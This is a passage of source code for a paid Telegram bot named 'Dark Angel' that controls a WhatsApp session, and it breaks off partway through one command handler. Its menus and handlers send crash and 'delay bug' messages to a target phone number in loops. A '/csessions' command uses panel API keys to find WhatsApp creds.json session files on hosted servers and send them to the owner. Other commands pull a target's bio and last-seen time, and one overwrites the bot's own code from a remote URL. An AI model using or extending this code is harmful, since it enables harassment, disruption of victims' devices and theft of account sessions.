    const q = args[1];
    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const processMsg = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: Checking...
⌑ Type: WhatsApp Bio Check`,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
            ]
        }
    });

    try {
 
        const contact = await sock.onWhatsApp(target);
        
        if (!contact || contact.length === 0) {
            await ctx.telegram.editMessageCaption(
                ctx.chat.id,
                processMsg.message_id,
                undefined,
                `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Not Found
⌑ Message: Nomor tidak terdaftar di WhatsApp`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                        ]
                    }
                }
            );
            return;
        }
 
        const contactDetails = await sock.fetchStatus(target).catch(() => null);
        const profilePicture = await sock.profilePictureUrl(target, 'image').catch(() => null);
        
        const bio = contactDetails?.status || "Tidak ada bio";
        const lastSeen = contactDetails?.lastSeen ? 
            moment(contactDetails.lastSeen).tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss') : 
            "Tidak tersedia";

        const caption = `
<blockquote><b>⬡═―—⊱ ⎧ BIO INFORMATION ⎭ ⊰―—═⬡</b></blockquote>
📱 <b>Nomor:</b> ${q}
👤 <b>Status WhatsApp:</b> ✅ Terdaftar
📝 <b>Bio:</b> ${bio}
👀 <b>Terakhir Dilihat:</b> ${lastSeen}
${profilePicture ? '🖼 <b>Profile Picture:</b> ✅ Tersedia' : '🖼 <b>Profile Picture:</b> ❌ Tidak tersedia'}

🕐 <i>Diperiksa pada: ${moment().tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss')}</i>`;

        // Jika ada profile picture, kirim bersama foto profil
        if (profilePicture) {
            await ctx.replyWithPhoto(profilePicture, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                       
                    ]
                }
            });
        } else {
            await ctx.replyWithPhoto(thumbnailUrl, {
                caption: caption,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 Chat Target", url: `https://wa.me/${q}` }]
                      
                    ]
                }
            });
        }

 
        await ctx.deleteMessage(processMsg.message_id);

    } catch (error) {
        console.error("Error checking bio:", error);
        
        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsg.message_id,
            undefined,
            `
<blockquote><b>⬡═―—⊱ ⎧ CHECKING BIO ⎭ ⊰―—═⬡</b></blockquote>
⌑ Target: ${q}
⌑ Status: ❌ Error
⌑ Message: Gagal mengambil data bio`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "📱 ☇ Target", url: `https://wa.me/${q}` }]
                    ]
                }
            }
        );
    }
});

// Fix Code
bot.command('fixcode', async (ctx) => {
  try {
    const userExplanation =
      ctx.message.text.split(' ').slice(1).join(' ').trim() ||
      "(no explanation provided)"

    const replyMsg = ctx.message.reply_to_message
    if (!replyMsg) {
      return ctx.reply(
        "❌ *Syntax Error!*\n\n" +
        "Gunakan:\n/fixcode <penjelasan>\n" +
        "Balas ke pesan berisi kode atau file.\n\n" +
        "Contoh:\n/fixcode perbaiki syntax error",
        { parse_mode: "Markdown" }
      )
    }

    let code = ""
    let filename = "fixedByZyuuOffc.js"
    let lang = "JavaScript"

    // ===== REPLY DOCUMENT =====
    if (replyMsg.document) {
      const fileId = replyMsg.document.file_id
      const fileLink = await ctx.telegram.getFileLink(fileId)
      const res = await axios.get(fileLink.href)

      code = res.data
      filename = replyMsg.document.file_name || "fixedByZyuuOffc.js"

      if (/\.php$/i.test(filename)) lang = "PHP"
      else if (/\.py$/i.test(filename)) lang = "Python"
      else if (/\.html?$/i.test(filename)) lang = "HTML"
      else if (/\.css$/i.test(filename)) lang = "CSS"
      else if (/\.json$/i.test(filename)) lang = "JSON"
      else lang = "JavaScript"

    // ===== REPLY TEXT =====
    } else if (replyMsg.text) {
      code = replyMsg.text
    } else {
      return ctx.reply("❌ Balas ke pesan teks atau file kode.")
    }

    await ctx.reply("🛠️ *Sedang memperbaiki kode...*", {
      parse_mode: "Markdown"
    })

    const completion = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "Kamu hanya boleh memperbaiki error dan merapikan format kode. " +
            "Berikan penjelasan error dan solusi, lalu tampilkan kode hasil perbaikan tanpa code block. " +
            "Format: ANALYSIS:[penjelasan] CODE:[kode hasil]"
        },
        {
          role: "user",
          content:
            userExplanation === "(no explanation provided)"
              ? `Perbaiki error dan rapikan format kode ${lang} ini:\n${code}`
              : `Perbaiki error dan rapikan format kode ${lang} ini berdasarkan penjelasan:\n${code}\n\nPenjelasan:\n${userExplanation}`
        }
      ]
    })

    const result = completion.choices[0].message.content || ""

    const analysis =
      result.match(/ANALYSIS:\s*([\s\S]*?)(?=CODE:|$)/i)?.[1]?.trim() ||
      "Tidak ada analisis spesifik."

    const fixedCode =
      result.match(/CODE:\s*([\s\S]*)$/i)?.[1]?.trim() ||
      result.trim()

    // ===== SEND ANALYSIS =====
    await ctx.replyWithHTML(
      `<pre>༑ᐧ 𖣂 DARK ANGEL 𖣂 ༑ᐧ</pre>
<b>( 🛠️ ) Code Fix Result</b>
<b>Language:</b> ${lang}
<b>User Explanation:</b> ${userExplanation}
<b>Error Analysis:</b>
${analysis}

© ZyuuOffc ϟ`
    )

    await ctx.replyWithDocument({
      source: Buffer.from(fixedCode),
      filename: `Fixed_${filename}`
    })

  } catch (err) {
    console.error(err)
    ctx.reply(`❌ Failed to fix code:\n${err.message}`)
  }
})

// Auto update
bot.command("update", async (ctx) => {
  const chatId = ctx.chat.id;

  const repoRaw =
    "https://raw.githubusercontent.com/codeaja776-lgtm/updatedark/refs/heads/main/ZyuuCase.js";

  await ctx.reply("⏳ Sedang mengecek update...");

  try {
    const { data } = await axios.get(repoRaw);

    if (!data) {
      return ctx.reply("❌ Update gagal: File kosong!");
    }

    fs.writeFileSync("./ZyuuCase.js", data);

    await ctx.reply(
      "✅ Update berhasil!\nSilakan restart bot."
    );

    // restart jika pakai PM2

  } catch (e) {
    console.error(e);
    ctx.reply(
      "❌ Update gagal. Pastikan repo dan file index.js tersedia."
    );
  }
});
// =================== /carisesi ===================
bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 Example : /csessions <domain>,<ptla>,<ptlc>");

  await ctx.reply(
    "⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ Terjadi error saat scan");
  }
});

const delay = (ms) => new Promise(res => setTimeout(res, ms));
        const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);
//============( MENU UTAMA ) =======\\

bot.use((ctx, next) => {
    if (secureMode) return;

    const text = (ctx.message && ctx.message.text) ? ctx.message.text : "";
    const data = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data : "";
    const isStart = (typeof text === "string" && text.startsWith("/start")) ||
                    (typeof data === "string" && data === "/start");

    if (!tokenValidated && !isStart) {
        if (ctx.callbackQuery) {
            try { ctx.answerCbQuery("🔑 Masukkan token anda untuk diaktifkan, Format: /start <token>"); } catch (e) {}
        }
        return ctx.reply("🔒 Akses terkunci ketik /start <token> untuk mengaktifkan bot");
    }
    return next();
});

bot.start(async (ctx) => {
    if (!tokenValidated) {
      const raw = ctx.message && ctx.message.text ? ctx.message.text : "";
      const parts = raw.trim().split(" ");
      const userToken = parts.length > 1 ? parts[1].trim() : "";

      if (!userToken) {
        return ctx.reply("🔑 Masukkan token anda untuk diaktifkan, Format: /start <token>");
      }

      try {
        const res = await axios.get(databaseUrl);
        const tokens = (res.data && res.data.tokens) || [];

        if (!tokens.includes(userToken) || userToken !== tokenBot) {
          return ctx.reply("❌ Token tidak terdaftar, masukkan yang valid");
        }

        tokenValidated = true;
        return ctx.reply("✅ Token berhasil diaktifkan, ketik /start untuk membuka menu utama");
      } catch (e) {
        return ctx.reply("❌ Gagal memverifikasi token");
      }
    }
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    
    const menuMessage = `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

 こんにちは、@${ctx.from.username}。自己紹介させてください。私は Dark Angel という 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットです。

🕊 - 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
───────────
〢☐ Developer: ZyuuOffc
〢☐ Username: ${ctx.from.first_name}
〢☐ Language: JavaScript
〢☐ Version: 12.0 Gen 3

🖥 - 𝐒𝐢𝐬𝐭𝐞𝐦 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
────────────────
〢☐ Sender: ${senderStatus}
〢☐ Runtime: ${runtimeStatus}
〢☐ StatusPremium: ${premiumStatus}
〢☐ Memory: ${memoryStatus}
〢☐ Cooldown: ${cooldownStatus} Second

Page 1/7</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/about"
            },
            {    text: "Owner",
                 url: "https://t.me/ZyuuOffc"
            }, 
            {
                text: ">",
                callback_data: "/controls"
            }
        ],
        [
            {
               text: "Information", url: "https://t.me/INFORMASI_DARK_ANGEL"
           }
        ],
    ];

    ctx.replyWithVideo(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action('/start', async (ctx) => {
    if (!tokenValidated) {
        try { await ctx.answerCbQuery(); } catch (e) {}
        return ctx.reply("🔑 Masukkan token anda untuk diaktifkan, Format: /start <token>");
    }
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
  
    const menuMessage = `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

 こんにちは、@${ctx.from.username}。自己紹介させてください。私は Dark Angel という 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 ボットです。

🕊 - 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
───────────
〢☐ Developer: ZyuuOffc
〢☐ Username: ${ctx.from.first_name}
〢☐ Language: JavaScript
〢☐ Version: 12.0 Gen 3

🖥 - 𝐒𝐢𝐬𝐭𝐞𝐦 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧
────────────────
〢☐ Sender: ${senderStatus}
〢☐ Runtime: ${runtimeStatus}
〢☐ StatusPremium: ${premiumStatus}
〢☐ Memory: ${memoryStatus}
〢☐ Cooldown: ${cooldownStatus} Second

Page 1/7</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/about"
            },
            {
                text: "Owner",
                url: "https://t.me/ZyuuOffc"
            }, 
            {
                text: ">",
                callback_data: "/controls"
            }
        ],
        [
             {
               text: "Information", 
               url: "https://t.me/INFORMASI_DARK_ANGEL"
           }
         ],
    ];
    
    try {
        await ctx.editMessageMedia({
            type: 'video',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const controlsMenu = `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

🕹 - 𝐂𝐨𝐧𝐭𝐫𝐨𝐥𝐬 𝐌𝐞𝐧𝐮
─────────────
〢☐ /addsender - Add Sender Number
〢☐ /resetsession - Reset Existing Session
〢☐ /setcooldown - Set Bot Cooldown
〢☐ /addprem - Add Premium Users
〢☐ /delprem - Delete Premium Users
〢☐ /addgroup - Add Premium Group
〢☐ /delgroup - Delete Premium Group
〢☐ /fixcode - Fixxed Code Error
〢☐ /update - Auto Update

Page 2/7</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/start"
            }, 
            {   text: "Owner",
                url: "https://t.me/ZyuuOffc"
            }, 
            {   text: ">",
                callback_data: "/bug"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

🧬 - 𝐃𝐞𝐥𝐚𝐲 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
──────────────
〢☐ /ZverxtVis [ Invisible Delay ]
〢☐ /Zwertas [ Medium Delay ]
〢☐ /Zxcyurt [ Delay Tag Sw ]
〢☐ /Zwextream [ Extreme Delay ]
〢☐ /Zverper [ Super Delay ]

🧬 - 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
────────────────
〢☐ /ForceLog [ Forclose Relog ]
〢☐ /ForceClk [ Forcloce Click ]
〢☐ /ForceStudnt [ Forcloce Invis No All Device ]
〢☐ /ForceLay [ Forcloce x Delay ]

🧬 - 𝐂𝐫𝐚𝐬𝐡 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞
──────────────
〢☐ /Lordsy [ Blank Andro No All Device ]
〢☐ /DarkKiller [ Blank Hard ]
〢☐ /FanCrash [ Crash Andro ]
〢☐ /CrosAngel [ Crash Andro V2 ]
〢☐ /BuldLank [ Blank X Buldo ]
──────────────
Example: /ZverxtVis 62xxxx 

Page 3/7</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/controls"
            }, 
            {   text: "Owner",
                url: "https://t.me/ZyuuOffc"
            }, 
            {   text: ">",
                callback_data: "/Faiq"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/Faiq', async (ctx) => {
    const bugMenu = `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

🧬 - 𝐃𝐞𝐥𝐚𝐲 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞 Combo
──────────────
〢☐ /Combox1 [ DELAY X BLANK ]
〢☐ /Combox2 [ DELAY X FC ]
〢☐ /Combox3 [ DELAY X CRASH ]
〢☐ /Combox4 [ DELAY X FC X CRASH X BLANK ]

🧬 - 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞 Combo
────────────────
〢☐ /Combox5 [ FC X DELAY ]
〢☐ /Combox6 [ FC X BLANK ]
〢☐ /Combox7 [ FC X CRASH ]
〢☐ /Combox8 [ FC X BULDO X BLANK ]

🧬 - 𝐂𝐫𝐚𝐬𝐡 𝐁𝐮𝐠 𝐓𝐲𝐩𝐞 Combo
──────────────
〢☐ /Combox9 [ BLANK X FC ]
〢☐ /Combox10 [ BLANK X DELAY ]
〢☐ /Combox11 [ CRASH X BULDO ]
〢☐ /Combox12 [ CRASH X BLANK ]
〢☐ /Combox13 [ CRASH X DELAY X BULDO X BLANK ]

Page 4/7</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/bug"
            }, 
            {   text: "Owner",
                url: "https://t.me/ZyuuOffc"
            }, 
            {   text: ">",
                callback_data: "/fun"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
bot.action('/about', async (ctx) => {
    const aboutMenu = `
<blockquote>
 Name       : Dark Angel
 Developer   : @ZyuuOffc
 Version      : 12.0 Gen 3
 Language    : JavaScript (Node.js)

 Description :
 WELCOME TO SCRIPT DARK ANGEL 
 こんにちは、Zyuuです。よりクールなテーマと外観を備えた新しいバージョン12.0をリリースしたいと思います。無造作にファックするのが好きな人に適しています。ハハハ、それだけです、犬、何を言えばいいのかわかりません。。
 © 2026 ZyuuOffc | All Team Dark Angel
 
 Page 𝟩/7</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/tqto"
            }, 
            {   text: "Owner",
                url: "https://t.me/ZyuuOffc"
            }, 
            {   text: ">",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(aboutMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

⚔️ - 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨
───────────
〢☐ ZyuuOffc 
〢☐ Amorrasie 
〢☐ Widixkecew01 
〢☐ VioliSIMX
〢☐ RealUcup 
〢☐ velceobatugiok2 
〢☐ fahrevx 
〢☐ KingNotDev 
〢☐ brayy4
〢☐ SIapayakLU
〢☐ DixxNotDev
〢☐ alzznewera 
〢☐ PetxzVps 
〢☐ LikzSukaBobo 
〢☐ pipyzganteng
〢☐ hannoffc1
〢☐ FranszOffc 
〢☐ itsmesastra1
〢☐ TINZXD_REAL
〢☐ Ara_naddd
〢☐ Hamz2304
〢☐ Mekinjirr
〢☐ ZissNew
〢☐ dickxmod
〢☐ okelowh
〢☐ bayyfxvo
〢☐ KengzzzOF

 Thank you for purchasing the Dark Angel script
 
 Page 6/7</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/fun"
            }, 
            {   text: "Owner",
                url: "https://t.me/ZyuuOffc"
            }, 
            {   text: ">",
                callback_data: "/about"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/fun', async (ctx) => {
    const funMenu = `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

🎭 - 𝐅𝐮𝐧 𝐌𝐞𝐧𝐮
──────────
〢☐ /iqc - Ss Chat Iphone
〢☐ /csessions - Scan Sender With Adp
〢☐ /tourl - Photos And Videos To Link
〢☐ /testfunc - Function Test
〢☐ /cekfunc - Check Error Function
〢☐ /trackweb - Tracking Website
〢☐ /statuswebsite - Check Status Website
〢☐ /cekid - Check Id Website
〢☐ /cekbio - Check Bio WhatsApp

Page 5/7</blockquote>`;

    const keyboard = [
        [
            {
                text: "<",
                callback_data: "/Faiq"
            },
            {   text: "Owner",
                url: "https://t.me/ZyuuOffc"
            }, 
            {   text: ">",
                callback_data: "/tqto"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(funMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "Error") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});
//============( CASE BUG ) =======\\
bot.command("ZverxtVis", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ZverxtVis 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Bebas Spam
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 20; i++) {
   await DelayCanSpamByMia(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Bebas Spam
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Zxcyurt", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Zxcyurt 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Hard
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await DelayStatusHardByMia(sock, target);
   await DelayStatusHardByMia(sock, target);
   await DelayCanSpamByMia(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Hard
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Zwertas", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Zwertas 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Medium
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 40; i++) {
   await DelayCanSpamByMia(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Medium
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Zwextream", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Zwextream 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
